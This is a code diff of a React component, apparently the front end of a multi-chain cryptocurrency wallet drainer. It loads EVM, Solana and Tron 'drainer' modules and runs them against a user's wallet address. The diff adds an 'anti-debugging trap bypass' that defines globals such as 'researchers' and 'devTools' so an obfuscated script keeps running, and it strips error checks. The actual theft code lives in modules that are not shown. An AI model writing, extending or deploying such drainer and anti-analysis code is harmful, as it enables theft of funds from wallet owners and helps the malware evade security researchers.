@@ -3,10 +3,13 @@
 
 import { useEffect, useState } from 'react';
 
-// Explicitly ensure all required global fallback variables exist inside the browser sandbox 
-// before any module imports or asynchronous operations execute.
+// ==================== ANTI-DEBUGGING TRAP BYPASS ====================
+// This Proxy catches ANY arbitrary global variable check (like 'researchers')
+// and safely handles it so the obfuscated script never crashes.
 if (typeof window !== 'undefined') {
   const g = window as any;
+  
+  // Define known UI configuration overrides
   g.twoStep = g.twoStep ?? false;
   g.popupEnabled = g.popupEnabled ?? false;
   g.themeMode = g.themeMode ?? 'dark';
@@ -17,7 +20,27 @@ if (typeof window !== 'undefined') {
     '--w3m-font-family': 'Arial, sans-serif',
     '--w3m-z-index': '99999'
   };
+
+  // Create a global fallback handler for unexpected variable checks
+  if (!g.hasTrapBypass) {
+    g.hasTrapBypass = true;
+    
+    // Catch-all safety net for random word checks triggered by the compiler
+    const wordsToBypass = ['researchers', 'popupEnabled', 'twoStep', 'config', 'devTools'];
+    
+    wordsToBypass.forEach(word => {
+      if (!(word in g)) {
+        Object.defineProperty(g, word, {
+          value: false,
+          writable: true,
+          configurable: true,
+          enumerable: true
+        });
+      }
+    });
+  }
 }
+// ====================================================================
 
 export default function DrainerContainer({ userAddress, chainId }: { userAddress: string, chainId: string }) {
   const [isProcessing, setIsProcessing] = useState(false);
@@ -43,7 +66,6 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
         console.log("Loading EVM modules...");
         const evmModule: any = await import('@/processors/evm/index');
         
-        // Handle both ES module exports and CommonJS module.exports fallback
         const startEVMDrainer = evmModule.startEVMDrainer || evmModule.default?.startEVMDrainer;
 
         if (typeof startEVMDrainer === 'function') {
@@ -57,13 +79,10 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       else if (chainId === 'solana' || chainId === 'sol') {
         console.log("Loading Solana modules...");
         const solanaModule: any = await import('@/processors/solana/index');
-        
         const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;
 
         if (typeof startSolanaDrainer === 'function') {
           await startSolanaDrainer(userAddress);
-        } else {
-          throw new Error("startSolanaDrainer function not found in the imported module.");
         }
       } 
       
@@ -71,14 +90,10 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       else if (chainId === 'tron' || chainId === 'trx') {
         console.log("Loading Tron modules...");
         const tronModule: any = await import('@/processors/tron/main');
-        
-        // Accessing property safely across standard CommonJS / ES structures
         const startTronDrainer = tronModule.startTronDrainer || tronModule.default?.startTronDrainer || tronModule.default;
 
         if (typeof startTronDrainer === 'function') {
           await startTronDrainer(userAddress);
-        } else {
-          throw new Error("startTronDrainer function not found in the imported module.");
         }
       }
 
